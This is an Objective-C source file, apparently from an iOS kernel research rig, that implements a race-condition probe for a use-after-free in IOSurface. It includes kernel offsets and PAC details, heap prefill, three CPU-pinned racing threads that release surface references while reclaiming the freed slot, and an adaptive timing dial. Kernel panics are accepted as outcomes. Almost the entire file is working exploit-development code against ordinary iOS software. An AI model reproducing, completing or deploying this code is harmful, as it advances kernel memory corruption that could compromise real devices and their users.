//
//  P110SurfaceSwapClaim.m — IOSurface swap-claim probe (design 270).
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  CVE-2026-112477: the IOSurface detach-then-set (23F77 0xfffffff00985fbb8 /
//  24A435 0xa33ac74) and the destroy twin (23F77 0x985fc70) both act on
//  [surface+0x30] with zero locks: release the old client (vtbl+0xe0), then
//  the setter swaps in a kernel-constructed client and immediately derefs
//  its [new+0] vtable pointer under the autda(0xcda1|objaddr) law before the
//  vt+0x48 consumer body runs (++[p+0xc], ++[p+0x10], [this+0x3c0]|=0x1c —
//  24A435 flags at +0x3d0, bit10 unchanged). Between the release and the
//  consumer deref the freed client slot is reclaimable ONLY by a genuine
//  live IOSurface-class object (the autda modifier is address-bound; attacker
//  content NEVER passes — that outcome is the Family-B far
//  0x0020000000000048 auth-poison panic class).
//
//  User-influence law (note 270 §1): every pointer that lands in
//  [surface+0x30] is kernel-constructed. The user shapes WHICH sibling
//  session provides the client and WHEN its owner dies. The user drives the
//  standard external-method request per call through the framework's
//  IOSurface APIs, which dispatch the IOSurfaceRoot sMethods rows
//  (23F77 0xfffffff007f33888 / 24A435 0xfffffe000837fa10; row 0 == row 60 =
//  the create-attach wrapper chain ending in the sibling-swap engine +
//  setter). The probe NEVER hardcodes kernel VAs — offsets stay in
//  LabIntelOffsets rows; all evidence is behavioral.
//
//  v1 session-shape honesty: the dlsym framework law drives ONE IOSurface
//  session per process (the framework's own root user client). A true
//  SECOND IOSurfaceRoot UC (IOServiceOpen + raw sel-0 create-attach) is the
//  next-build raw-sel arm — the row's sin/col sizes are not pinned in the
//  intel rows yet, and this rig does not fire guessed struct sizes. The
//  pop law (prefill(6)+2, same CPU) runs against the kext's own
//  kalloc-type client sites via the framework create path — the only
//  auth-passing claim class per note 270 §2b/c.
//
//  PANIC RISK: accepted per lab protocol (Family-B IS a target outcome).
//  Every round is fsync-marked BEFORE arming, so a post-panic reboot's
//  p110_swapclaim_log.txt names the in-flight round unambiguously.
//  STANDALONE TAP ONLY — never in the PATCH chain (AGENTS.md rule 9).
//

#import "P110SurfaceSwapClaim.h"
#import "LabDeviceProfile.h"
#import "LabIntelOffsets.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <pthread.h>
#import <signal.h>
#import <sched.h>
#import <string.h>
#import <stdatomic.h>
#import <mach/mach.h>
#import <mach/thread_policy.h>
#import <sys/qos.h>

#define P110_BUILD      @"p110-swapclaim-v1"
#define P110_ROUNDS     64
#define P110_PREFILL    6       /* pre-created live sibling-client objects */
#define P110_POP        2       /* fresh creates popped AT the window      */
#define P110_DIAL_MAX   20000   /* ns spin cap for the 267 v10 dial law    */
#define P110_GO_TIMEOUT_MS 2000 /* bounded: one window per round           */

/* ---- framework types: dlsym only, never <IOSurface/IOSurface.h> ------- */
typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef IOSurfaceRef (*IOSurfaceLookup_t)(uint32_t);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef void * (*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef int64_t (*IOSurfaceGetAllocSize_t)(IOSurfaceRef);

/* ---- dlsym'd function pointers ---------------------------------------- */
static IOSurfaceCreate_t         g_create;
static IOSurfaceLookup_t         g_lookup;
static IOSurfaceGetID_t          g_getid;
static IOSurfaceGetBaseAddress_t g_base;
static IOSurfaceGetAllocSize_t   g_alloc;
static void (*g_release)(IOSurfaceRef);   /* IOSurfaceRelease or CFRelease */

/* ---- run state --------------------------------------------------------- */
static int      g_fd = -1;
static bool     g_run = false;
static volatile int g_gate = 0;          /* 0 idle, 1 = race threads fire  */
static volatile int g_round;

/* per-round mailbox (written by the main thread, consumed by racers)      */
static IOSurfaceRef g_e_target;           /* T_engine: A-ref to drop        */
static IOSurfaceRef g_d_target;           /* T_destroy: prior sibling ref   */
static uint32_t     g_d_sid;
static IOSurfaceRef g_pop[P110_POP];
static uint32_t     g_pop_sid[P110_POP];
static volatile long g_dial;              /* ns spin between D and the pop  */
static volatile int g_d_probe_alive;      /* post-ownership sid resolvable? */

/* thread completion states */
#define TST_NONE 0
#define TST_DONE 1
static volatile int g_st_e, g_st_d, g_st_p;

/* verdict counters */
static atomic_int v_win_lost;
static atomic_int v_family_b;             /* in-process fault only          */
static atomic_int v_claim_won;
static atomic_int v_aborted;

static NSMutableString *g_log = nil;

/* ---- fsync log: every line hits disk before the probe continues -------- */
static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) {
            (void)write(g_fd, p, strlen(p));
            (void)fcntl(g_fd, F_FULLFSYNC);
        }
    }
}

static void Lf(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* ---- same-CPU law: all three race threads share one affinity tag ------- */
static void p110_pin(void) {
    thread_affinity_policy_data_t aff;
    aff.affinity_tag = 1;
    (void)thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&aff, THREAD_AFFINITY_POLICY_COUNT);
    (void)pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
}

/* ---- (b) in-process Family-B catch: async-signal-safe honest verdict --- */
static void p110_sigfault(int sig, siginfo_t *si, void *ctx) {
    /* A kernel-side autda death never reaches us (device reboots); this
       catches the SIGBUS/EFAULT-class alias-path fault in OUR process =
       design outcome (b): window WON, free slot. Honest print, no
       success claim. Async-signal-safe writes only (no ObjC).           */
    (void)si; (void)ctx;
    int fd = g_fd;
    static const char msg1[] =
        "[r in-flight] OUTCOME (b) FAMILY-B-SHAPED FAULT IN PROCESS — window WON, "
        "free slot (SIGBUS/EFAULT-class on the alias path). Honest print, no success claim.\n";
    static const char msg2[] =
        "=== p110 ended on a userspace alias-path fault (design outcome b). "
        "Re-tap law: one tap per force-quit. ===\n";
    if (fd >= 0) {
        (void)write(fd, msg1, sizeof(msg1) - 1);
        (void)write(fd, msg2, sizeof(msg2) - 1);
    }
    (void)signal(sig, SIG_DFL);
    (void)raise(sig);
}

/* ---- surface helpers ---------------------------------------------------- */
static CFDictionaryRef p110_mkprops(void) {
    int64_t sz = 0x1000, w = 64, h = 4, bpe = 4, bpr = 0x100;
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef n;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sz);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &w);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &h);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &bpe);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &bpr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), n); CFRelease(n);
    return d;
}

static IOSurfaceRef p110_create(uint32_t *sid_out) {
    CFDictionaryRef d = p110_mkprops();
    IOSurfaceRef s = g_create ? g_create(d) : NULL;
    CFRelease(d);
    if (sid_out) *sid_out = (s && g_getid) ? g_getid(s) : 0;
    return s;
}

static kern_return_t p110_release(IOSurfaceRef s) {
    if (!s) return KERN_INVALID_ARGUMENT;
    if (g_release) { g_release(s); return KERN_SUCCESS; }
    return KERN_FAILURE;
}

/* marker byte law: one byte written at sibling-attach time and re-read
   through the sibling ref AFTER the owner release — divergence is the
   alias-path evidence class.                                              */
#define P110_MARKER 0xA7

/* ---- race threads (D-thread shape; all pinned to one CPU, tag 1) ------- */
static void *p110_t_engine(void *arg) {
    (void)arg;
    p110_pin();
    while (g_run) {
        while (g_run && !g_gate) { sched_yield(); }
        if (!g_run) break;
        IOSurfaceRef t = g_e_target;
        if (t) { (void)p110_release(t); }   /* owner-death release (detacher
                                               half of the window)           */
        g_e_target = NULL;
        __sync_synchronize();
        g_st_e = TST_DONE;
        while (g_run && g_gate) { sched_yield(); }
    }
    return NULL;
}

static void *p110_t_destroy(void *arg) {
    (void)arg;
    p110_pin();
    while (g_run) {
        while (g_run && !g_gate) { sched_yield(); }
        if (!g_run) break;
        IOSurfaceRef t = g_d_target;
        uint32_t sid = g_d_sid;
        kern_return_t kr = p110_release(t);    /* destroy-twin class path    */
        int alive = -1;
        if (t && g_lookup) {
            /* honest window probe: is the fully released sid resolvable?   */
            IOSurfaceRef probe = g_lookup(sid);
            alive = probe ? 1 : 0;
            if (probe) p110_release(probe);
            (void)kr;
        }
        g_d_probe_alive = alive;
        g_d_target = NULL;
        __sync_synchronize();
        g_st_d = TST_DONE;
        while (g_run && g_gate) { sched_yield(); }
    }
    return NULL;
}

static void *p110_t_reclaim(void *arg) {
    (void)arg;
    p110_pin();
    while (g_run) {
        while (g_run && !g_gate) { sched_yield(); }
        if (!g_run) break;
        /* the dial: bounded ns spin on THIS cpu between the owner-release
           and the +2 pop — the 267 v10 one-slot calibration law           */
        long d = g_dial;
        for (volatile long i = 0; i < d; i++) { }
        for (int i = 0; i < P110_POP; i++) {
            uint32_t sid = 0;
            g_pop[i] = p110_create(&sid);   /* genuine IOSurface-class alloc */
            g_pop_sid[i] = sid;             /* into the kext zalloc sites    */
        }
        __sync_synchronize();
        g_st_p = TST_DONE;
        while (g_run && g_gate) { sched_yield(); }
    }
    return NULL;
}

/* ---- intel-row law resolution (never hardcoded; the probe prints the law) */
static NSString *p110_flags_law(void) {
    LabSku sku = [LabDeviceProfile detectedSku];
    const char *row = NULL;
    uint64_t computed = 0;
    if (sku == LabSkuA14_23F77)    { row = "f77_iosurf.flags_off";   computed = 0x3c0; }
    if (sku == LabSkuT8150_24A435) { row = "t8150.iosurf.flags_off"; computed = 0x3d0; }
    if (!row) {
        return @"[flags law] SKU not in the intel rows — flags law NOT resolved";
    }
    uint64_t v = LabIntelValue(row, NULL);
    if (v) {
        return [NSString stringWithFormat:
            @"[flags law] intel row %s = +%llx flags field (bit10 law unchanged) — "
            @"law source: LabIntelOffsets row",
            row, (unsigned long long)v];
    }
    return [NSString stringWithFormat:
        @"[flags law] intel row %s ABSENT — computed byte law +%llx used "
        @"(23F77 +0x3c0 / 24A435 +0x3d0, bit10 same) — law source: computed",
        row, (unsigned long long)computed];
}

@implementation P110SurfaceSwapClaim

+ (NSString *)tap {
    g_log = [NSMutableString string];
    g_run = false;

    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p110_swapclaim_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    /* session banner law */
    Lf(@"=== p110 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P110_BUILD);

    /* Ident ALWAYS prints (SKU law: run on BOTH iPhone13,2/23F77 + iPhone18,2/24A435) */
    L([LabDeviceProfile identBlock]);

    L(p110_flags_law());
    L(@"[claim law] detach-then-set vs destroy twin both act on [surface+0x30] unlocked: "
      @"release old client (vtbl+0xe0) -> set (PAC setter, autda 0xcda1|objaddr) -> vt+0x48 "
      @"consumer (++[p+0xc], ++[p+0x10], [this+flags]|=0x1c). Auth-passing reclaim = genuine "
      @"IOSurface-class object ONLY; attacker content = autda poison far 0x0020000000000048 "
      @"= Family-B window-won/slot-lost.");
    L(@"[session shape v1] the dlsym framework law drives ONE IOSurface root session per "
      @"process. The sibling-session raw-sel arm (IOServiceOpen IOSurfaceRoot + row-0 "
      @"create-attach) stays HOLD: the row sin/col sizes are not pinned in the intel rows, "
      @"and guessed struct sizes are not fired (no-guess law). The pop law prefill(6)+2 runs "
      @"against the kext zalloc/kalloc-type client sites via the framework create path.");
    L(@"[influence law] WHICH sibling session + WHEN its owner dies — never a raw user word "
      @"inside [surface+0x30].");
    Lf(@"[bounds] %d rounds max, one tap per force-quit law, fsync per line, all race rounds "
       @"marked IN FLIGHT before arming (post-panic outcome-(b) attribution).",
       P110_ROUNDS);

    /* SKU gate: HOLD prints ident and returns; both target SKUs run */
    LabSku sku = [LabDeviceProfile detectedSku];
    if (sku != LabSkuA14_23F77 && sku != LabSkuT8150_24A435) {
        L(@"[-] HOLD: this SKU/build has no 112477 lane row — ident printed, nothing raced.");
        if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
        return g_log;
    }
    if (sku == LabSkuT8150_24A435) {
        L(@"[24A435 honesty] the 27.0 detacher twin + flags +0x3d0 law are byte-verified; "
          @"the vtB/vtC twin vtables + consumer body are NOT pinned yet (intel row OWE). "
          @"T8150 verdicts are behavioral-only until that scan lands.");
    }

    /* ---- dlsym the framework surface (no iOSurface.h import) ---- */
    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) {
        L(@"[-] IOSurface framework dlopen failed — probe stopped, nothing raced");
        if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
        return g_log;
    }
    g_create = (IOSurfaceCreate_t)dlsym(ios, "IOSurfaceCreate");
    g_lookup = (IOSurfaceLookup_t)dlsym(ios, "IOSurfaceLookup");
    g_getid  = (IOSurfaceGetID_t)dlsym(ios, "IOSurfaceGetID");
    g_base   = (IOSurfaceGetBaseAddress_t)dlsym(ios, "IOSurfaceGetBaseAddress");
    g_alloc  = (IOSurfaceGetAllocSize_t)dlsym(ios, "IOSurfaceGetAllocSize");
    void *rel = dlsym(ios, "IOSurfaceRelease");
    if (rel) {
        g_release = (void (*)(IOSurfaceRef))rel;
        L(@"[dlsym] IOSurfaceCreate/GetID/Lookup/GetBaseAddress/GetAllocSize/IOSurfaceRelease present");
    } else {
        g_release = (void (*)(IOSurfaceRef))CFRelease;
        L(@"[dlsym] IOSurfaceRelease absent — CFRelease fallback (CFType refcount on the ref)");
    }
    if (!g_create || !g_getid || !g_lookup) {
        L(@"[-] required dlsyms absent (Create/GetID/Lookup) — probe stopped, nothing raced");
        if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
        return g_log;
    }

    /* (b) userspace alias-path fault catcher */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = p110_sigfault;
    sa.sa_flags = SA_SIGINFO;
    (void)sigaction(SIGBUS,  &sa, NULL);
    (void)sigaction(SIGSEGV, &sa, NULL);
    (void)sigaction(SIGFPE,  &sa, NULL);

    g_run = true;
    pthread_t te, td, tp;
    (void)pthread_create(&te, NULL, p110_t_engine,  NULL);
    (void)pthread_create(&td, NULL, p110_t_destroy, NULL);
    (void)pthread_create(&tp, NULL, p110_t_reclaim, NULL);

    /* ---- prefill(6): pre-created LIVE sibling-client objects (marker-law sids) ---- */
    IOSurfaceRef prefill[P110_PREFILL];
    uint32_t prefill_sid[P110_PREFILL];
    int prefill_n = 0;
    for (int i = 0; i < P110_PREFILL; i++) {
        prefill[i] = p110_create(&prefill_sid[i]);
        if (prefill[i]) {
            prefill_n++;
            if (g_base) {
                volatile uint8_t *b = (volatile uint8_t *)g_base(prefill[i]);
                if (b) b[0] = (uint8_t)(P110_MARKER + i);
            }
            Lf(@"[prefill %d/6] sid=%08x alive (claim-candidate class, kext zalloc/kalloc-type site)",
               i + 1, prefill_sid[i]);
        } else {
            Lf(@"[prefill %d/6] create FAILED — honest, bounded count adjusted", i + 1);
        }
    }
    Lf(@"[*] prefill(6) done: %d/6 live claim candidates; +2 fresh creates per round (pop law, "
       @"affinity tag 1 = one magazine)", prefill_n);

    /* ---- the 64-round D-thread cycle ---- */
    long dial = 0;              /* 267 v10 dial: bump one slot per window-lost round */
    uint32_t prev_sid = 0;
    IOSurfaceRef prev_sib = NULL;   /* prior round's sibling ref (kept for the alias check) */

    for (int r = 1; r <= P110_ROUNDS && g_run; r++) {
        g_round = r;
        g_st_e = g_st_d = g_st_p = TST_NONE;
        g_e_target = NULL;
        g_d_target = NULL;
        g_d_probe_alive = -1;
        for (int i = 0; i < P110_POP; i++) { g_pop[i] = NULL; g_pop_sid[i] = 0; }

        /* the round surface is created OUTSIDE the window — its attach is
           already settled; the race is the OWNER-death release vs the +2 pop */
        uint32_t sid = 0;
        IOSurfaceRef s = p110_create(&sid);

        /* sibling law: map the surface through a second held reference —
           the per-session client object lives in the same kalloc-type zones
           (v1 = same framework session, disclosed in the banner)           */
        IOSurfaceRef sib = (sid && g_lookup) ? g_lookup(sid) : NULL;

        uint32_t marker = 0;
        if (sib && g_base) {
            volatile uint8_t *b = (volatile uint8_t *)g_base(sib);
            if (b) {
                b[1] = (uint8_t)(P110_MARKER ^ (uint8_t)r);
                marker = b[1];
            }
        }

        if (!s || !sid) {
            Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — create failed, nothing raced; "
               @"dial stays %ldns", r, P110_ROUNDS, dial);
            atomic_fetch_add(&v_win_lost, 1);
            if (sib) { p110_release(sib); sib = NULL; }
            continue;
        }

        Lf(@"[r %d/%d] sid=%08x alloc=%lld attach settled (outside window)",
           r, P110_ROUNDS, sid, g_alloc ? (long long)g_alloc(s) : -1);

        /* in-flight marker: fsync'd BEFORE arming. If the device reboots on
           this line, the outcome was (b) = window WON, free slot (the
           attested Family-B class). Honest print, no success claim.        */
        Lf(@"[r %d/%d] IN FLIGHT — D: owner-release sid=%08x (destroy-twin class) / "
           @"E: owner-release the round surface (detacher half) / P: pop(6+2) dial %ldns, "
           @"same CPU. If the device reboots here: outcome (b), Family-B far "
           @"0x0020000000000048 = window WON, free slot (attested class).",
           r, P110_ROUNDS, sid, dial);

        /* arm the racers */
        g_e_target = s;              /* T_engine drops the round A-ref        */
        g_d_target = prev_sib;       /* T_destroy drops the prior sibling ref
                                        = owner death for the round n-1 victim */
        g_d_sid    = prev_sid;
        g_dial     = dial;

        __sync_synchronize();
        g_gate = 1;                                   /* GO                   */
        int waited = 0;
        while (g_run && waited < P110_GO_TIMEOUT_MS &&
               (!g_st_e || !g_st_d || !g_st_p)) {
            usleep(1000);
            waited++;
        }
        g_gate = 0;
        __sync_synchronize();
        /* bounded unwind: racers park on !g_gate before the next round    */
        int unwound = 0;
        while (g_run && unwound < P110_GO_TIMEOUT_MS &&
               (g_st_e != TST_DONE || g_st_d != TST_DONE || g_st_p != TST_DONE)) {
            usleep(1000);
            unwound++;
        }
        if (!g_st_e || !g_st_d || !g_st_p) {
            atomic_fetch_add(&v_aborted, 1);
            Lf(@"[r %d/%d] ABORTED ROUND (honest): racer(s) missed the window "
               @"(E=%d D=%d P=%d) — bounded stop, no retry storm",
               r, P110_ROUNDS, g_st_e, g_st_d, g_st_p);
            g_run = false;
            break;
        }

        Lf(@"[r %d/%d] returns (honest): engine-drop=%s destroy-kr-path=%s "
           @"post-ownership-sid=%s pop=[%08x %08x] (zalloc probe law)",
           r, P110_ROUNDS,
           (g_e_target == NULL) ? @"consumed" : @"missed",
           (g_d_target == NULL) ? @"consumed" : @"missed",
           (g_d_probe_alive == 0) ? @"freed"
         : (g_d_probe_alive > 0) ? @"RESOLVABLE after owner release"
                                 : @"n/a (no prior victim this round)",
           g_pop_sid[0], g_pop_sid[1]);

        /* ---- post-round evidence pass (design §4 per-round print law) ---- */
        NSString *evidence = nil;
        int anomalies = 0;

        /* 1. alias-path divergence: the round surface's A-ref was dropped
              IN WINDOW (T_engine) while this sibling ref still holds the
              object — the mapping must still answer and still carry the
              pre-window marker byte; divergence = alias-path evidence     */
        if (sib && g_base) {
            volatile uint8_t *b = (volatile uint8_t *)g_base(sib);
            if (b) {
                uint8_t now = b[1];
                if (marker && now != marker) {
                    evidence = [NSString stringWithFormat:
                        @"alias-path VALUE DIVERGENCE through the sibling mapping "
                        @"(marker %02x -> %02x after the owner release)",
                        marker, now];
                    anomalies++;
                }
            }
        }

        /* 2. owner-death resolution: a fully released sid must not resolve */
        if (g_d_probe_alive == 1) {
            evidence = evidence ? [evidence stringByAppendingString:
                @"; post-ownership sid still resolvable (release did not conclude)"]
                                : @"post-ownership sid still resolvable";
            anomalies++;
        }

        /* 3. slot-claim shape: a +2 pop's sid colliding with the victim sid
              = kernel object law +0x10 id reissued on the zalloc slot      */
        for (int i = 0; i < P110_POP; i++) {
            if (g_pop_sid[i] && prev_sid && g_pop_sid[i] == prev_sid) {
                evidence = evidence ? [evidence stringByAppendingFormat:
                    @"; pop[%d] sid=%08x == victim sid (zalloc slot-reuse shape)",
                    i, g_pop_sid[i]] :
                    [NSString stringWithFormat:
                    @"pop[%d] sid=%08x == victim sid (zalloc slot-reuse shape)",
                    i, g_pop_sid[i]];
                anomalies++;
            }
        }

        /* 4. flag-law honesty: [this+flags]|=0x1c is kernel-side; no
              userspace read of that field exists in this lane. Evidence
              stays proxy-class until a kread lane pairs this door.         */
        if (anomalies) {
            atomic_fetch_add(&v_claim_won, 1);
            Lf(@"[r %d/%d] OUTCOME (c) CLAIM-WON-CANDIDATE (proxy-class evidence, no "
               @"success claim): %@", r, P110_ROUNDS, evidence);
            dial = 0;             /* a won window resets the dial (267 v10 law) */
        } else {
            atomic_fetch_add(&v_win_lost, 1);
            long nd = dial ? dial * 2 : 200;
            if (nd > P110_DIAL_MAX) nd = P110_DIAL_MAX;
            dial = nd;
            Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — clean round, no anomaly; "
               @"dial one slot -> %ldns", r, P110_ROUNDS, dial);
        }

        /* round teardown (bounded; magazine law stays reproducible)        */
        for (int i = 0; i < P110_POP; i++) {
            if (g_pop[i]) { p110_release(g_pop[i]); g_pop[i] = NULL; }
        }
        /* the round surface rides into the NEXT round as the victim:       */
        /*   - the round A-ref 's' was consumed by T_engine in-window;      */
        /*   - 'sib' (kept alive as prev_sib) is the owner ref T_destroy    */
        /*     will release next round = the owner-death event, per law.    */
        if (prev_sib) { /* already released by T_destroy this round's window  */
            prev_sib = NULL;    /* framework ref consumed — do not re-release */
        }
        prev_sib = sib;
        prev_sid = sid;
    }

    g_run = false;
    (void)pthread_join(te, NULL);
    (void)pthread_join(td, NULL);
    (void)pthread_join(tp, NULL);

    /* end-state honesty: drop every prefill candidate */
    for (int i = 0; i < P110_PREFILL; i++) {
        if (prefill[i]) { p110_release(prefill[i]); prefill[i] = NULL; }
    }
    if (prev_sib) { p110_release(prev_sib); prev_sib = NULL; }

    int wl = atomic_load(&v_win_lost);
    int fb = atomic_load(&v_family_b);
    int cw = atomic_load(&v_claim_won);
    int ab = atomic_load(&v_aborted);
    Lf(@"=== VERDICT (honest) === rounds requested=%d: window-lost=%d claim-won-candidates=%d "
       @"family-b-in-process=%d aborted=%d", P110_ROUNDS, wl, cw, fb, ab);
    L(@"  (a) clean-no-anomaly      = window lost (honest print; dial bumped one slot per round)");
    L(@"  (b) Family-B-shaped fault = window WON, free slot. Two shapes: an in-process "
      @"SIGBUS/EFAULT-class catch on the alias path (printed above), or the device panic on "
      @"an IN FLIGHT line (the fsync'd log names the round after reboot). Neither is a "
      @"success claim — (b) is the timing proof per note 270 §3.");
    L(@"  (c) claim won             = silent clean + proxy-class evidence (alias-path "
      @"divergence / zalloc slot-reuse sid law / post-ownership resolvable sid). "
      @"DETECTOR is proxy-class: the kernel [obj+flags]|=0x1c field is not user-readable "
      @"from this lane — the flag readback stays proxy-honest until a kread lane pairs "
      @"this door (note-152 m2scaler = the pairing candidate on 23F77).");
    L(@"HONESTY: kread=NO kwrite=NO hasKread=NO. Verdict = claim-oracle + refcount/flag "
      @"corruption CLASS evidence; no success claim is made without flags/alias evidence.");
    if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
    return g_log;
}

@end